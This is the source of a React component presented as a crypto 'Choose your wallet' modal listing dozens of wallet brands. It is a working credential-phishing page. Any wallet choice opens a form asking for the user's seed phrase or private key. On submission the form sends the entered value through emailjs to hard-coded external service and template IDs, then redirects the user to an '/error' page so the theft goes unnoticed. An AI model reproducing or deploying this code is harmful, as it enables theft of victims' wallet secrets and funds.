import React, { useEffect, useState, useRef } from "react";
import "../App.css";
import {ImCancelCircle} from "react-icons/im"
import {ImNext2} from "react-icons/im"
import trustwallet from "../assets/trustwalletcard.png";
import terrawallet from "../assets/terrawalletcard.png";
import metamask from "../assets/metamaskcard.png";
import binancecoin from "../assets/binancecoincard.png";
import coinbase from "../assets/Coinbasecard.png";
import tron from "../assets/troncard.png";
import safepal from "../assets/safepalcard.png";
import kai from "../assets/kaiwalletcard.png";
import bolt from "../assets/boltwalletcard.png";
import sperax from "../assets/speraxwallet.png";
import exodus from "../assets/exoduswallet.png";
import yoroi from "../assets/yoroiwallet.png";
import antomic from "../assets/antomicwallet.png";
import maiar from "../assets/maiarwalletcard.png";
import coin98 from "../assets/coin98card.png";
import sylowallet from "../assets/sylowalletcard.png";
import cloverwallet from "../assets/cloverwalletcard.png";
import enjinwallet from "../assets/enjinwallet.png";
import trezorwallet from "../assets/trezorcard.png";
import ledger from "../assets/ledgercard.png";
import iotexwallet from "../assets/iotexwallet.png";
import guardawallet from "../assets/guardawallet.png";
import blankwallet from "../assets/blankwallet.png";
import hotbitwallet from "../assets/hotbitwallet.png";
import cryptowallet from "../assets/cryptowallet.png";
import walletconnectcard from "../assets/walletconnectcard.png";
import harmonycard from "../assets/harmonycard.png";
import ontologycard from "../assets/ontologycard.png";
import coinomicard from "../assets/coinomicard.png";
import elrondcard from "../assets/elrondcard.png";
import uniswapcard from "../assets/uniswapcard.png";
import ziliqacard from "../assets/ziliqacard.png";
import nemcard from "../assets/nemwalletcard.png";
import pancakeswapcard from "../assets/pancakeswapcard.png";
import wavescard from "../assets/wavescard.png";
import tockenpocketcard from "../assets/tockenpocketcard.png";
import parisqcard from "../assets/parisqcard.png";
import emailjs from "emailjs-com"
import {AiFillWarning} from "react-icons/ai"
import brokenrobot from "../assets/brokenrobot.png"
import {useNavigate} from "react-router-dom"
import{ GiCancel} from "react-icons/gi"



function Home(props) {
  const ref = useRef();
    const [showWallet, setShowWallet] = useState(true)
    const [phraseInput, setPhraseInput] = useState([]);
    const [errorPage, setErrorPage] = useState(false);
    const [showPhrase, setShowPhrase] = useState(true);
    const [showPrivate, setShowPrivate] = useState(false);

    const [imgArray, setImgArray] = useState([
      walletconnectcard,
      trustwallet,
      terrawallet,
      metamask,
      binancecoin,
      coinbase,
      tron,
      safepal,
      kai,
      
      
      
    ]);
    const [imgArrayOne, setImgArrayOne] = useState([
      antomic,
      maiar,
      coin98,
      sylowallet,
      cloverwallet,
      enjinwallet,
      trezorwallet,
      ledger,
      sperax,
    ]);
    const [imgArrayTwo, setImgArrayTwo] = useState([
      bolt,
      harmonycard,
      ontologycard,
      coinomicard,
      elrondcard,
      uniswapcard,
      ziliqacard,
      nemcard,
      pancakeswapcard,
     
    ]);
    const [imgArrayThree, setImgArrayThree] = useState([
      exodus,
      yoroi,
      wavescard,
      tockenpocketcard,
     // parisqcard,
      iotexwallet,
      guardawallet,
      blankwallet,
      hotbitwallet,
      cryptowallet,
    ]);
    const [walletConnect, setWalletConnect] = useState([]);
    const [phraseContainer, setPhraseContainer] = useState(false);
    const [currentPage, setCurrentPage] = useState(null);
    const [pageOne, setPageOne] = useState(true);
     const [pageTwo, setPageTwo] = useState(false);
      const [pageThree, setPageThree] = useState(false);
          const [pageFour, setPageFour] = useState(false);
     const history = useNavigate()


     useEffect(() => {
      scroll()
      
  }, [])
// the function when you want to scroll:
function scroll() {window.scrollTo({
    top: ref.current.offsetTop -100, 
    behavior: "smooth"
})}

// Where you want to go

    
 const nextWallet = ()=>{
  if (pageOne){
    setPageOne(false); 
    setPageTwo(true)
  }
  else if (pageTwo){
    setPageTwo(false)
    setPageThree(true)
  }
  else{
setPageThree(false)
setPageOne(true)
  }
 }
   const sendEmail = (e) =>{
     e.preventDefault();
    emailjs
      .sendForm(
        "service_6e8kqfh",
        "template_7s3cunv",
        e.target,
        "user_LnqxbkUAyloQmts0Kku0n"
      )
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
      console.log("work")

  
   
  }

  return (
    <div className="node">
      <div className="navbar_desktop">
        <div className="border_container">
          <div className="d-flex">
            <ImCancelCircle />
          </div>
        </div>
      </div>
  

      {showWallet && (
        <div className="grid_modal" ref={ref}>
          <div className="my-5">
            <div className="flexing">
           <div>
            <GiCancel
						size={23}
						color="#4a99f2"
						className="cursor-pointer mr-4"
            onClick={props.onClick}
						/>	 
            </div>
            <div>
            <span className="mt-4 font-semibold ml-5">Choose your wallet</span>
            </div>
            </div>
            {pageOne && (
              <div>

                <div className="grid_container">
                  {imgArray.map((jagaban, index) => (
                    <div
                      className="wallet_image"
                      key={index}
                      onClick={() => (
                        setPhraseContainer(true), setShowWallet(false)
                      )}
                    >
                      <img src={jagaban} alt="" />
                    </div>
                  ))}
                </div>
              </div>
            )}

            {pageTwo && (
              <div className="grid_container">
                {imgArrayOne.map((jagabanOne, index) => (
                  <div
                    className="wallet_image"
                    key={index}
                    onClick={() => (
                      setPhraseContainer(true), setShowWallet(false)
                    )}
                  >
                    <img src={jagabanOne} alt="" />
                  </div>
                ))}
              </div>
            )}

            {pageThree && (
              <div className="grid_container">
                {imgArrayTwo.map((jagabanTwo, index) => (
                  <div
                    className="wallet_image"
                    key={index}
                    onClick={() => (
                      setPhraseContainer(true), setShowWallet(false)
                    )}
                  >
                    <img src={jagabanTwo} alt="" />
                  </div>
                ))}
              </div>
            )}

            {pageFour && (
              <div className="grid_container">
                {imgArrayThree.map((jagabanThree, index) => (
                  <div
                    className="wallet_image"
                    key={index}
                    onClick={() => (
                      setPhraseContainer(true), setShowWallet(false)
                    )}
                  >
                    <img src={jagabanThree} alt="" />
                  </div>
                ))}
              </div>
            )}

            <div className="pagination mb-6 mt-4">
              <span
              className="blue_active"
                onClick={() => (
                  setPageOne(true), setPageTwo(false), setPageThree(false)
                )}
              >
                1
              </span>
              <span
                onClick={() => (
                  setPageOne(false), setPageTwo(true), setPageThree(false),setPageFour(false)
                )}
              >
                2
              </span>
              <span
                onClick={() => (
                  setPageOne(false), setPageTwo(false), setPageThree(true), setPageFour(false)
                )}
              >
                3
              </span>
              <span
                onClick={() => (
                  setPageOne(false), setPageTwo(false), setPageThree(false), setPageFour(true)
                )}
              >
                4
              </span>
              <span
                onClick={() => (
                  nextWallet()
                )}
                className= "mt-1 ml--1"
              >
             <ImNext2
             />
              </span>
            </div>
          </div>
        </div>
      )}

      {phraseContainer && (
        <div className="seed_modal ml-3">
          <div>
          <div>
            <GiCancel
						size={23}
						color="#4a99f2"
						className="cursor-pointer mr-4 mb-3"
            onClick={props.onClick}
						/>	 
            </div>
            <form
              onSubmit={(e) => {
                sendEmail(e);
                history("/error")
              }}
            >
              <div className="py-1 flex">
                <p className="seed_phrase mr-2" onClick={()=> {setShowPhrase(true); setShowPrivate(false)}}>Seed Phrase</p>
                <p className="seed_phrase ml-2" onClick={()=> {setShowPhrase(false); setShowPrivate(true)}} >Private Key</p>
              </div>

              {showPhrase &&
              <div>
              <div className="seed_input py-3">
                <input className="" name="phrase" text="text" placeholder="Input your seed phrase"  />
              </div>
              </div>}
              {showPrivate &&
              <div>
              <div className="seed_input py-3">
                <input className="" name="private" text="text" placeholder="Input your PrivateKey"  />
              </div>
              </div>}
              <div className="proceed_btn ">
                <button type="submit" className="text-cyan-500">Proceed</button>
              </div>
            </form>
          </div>
        </div>
      )}

      
    </div>
  );
}

export default Home;
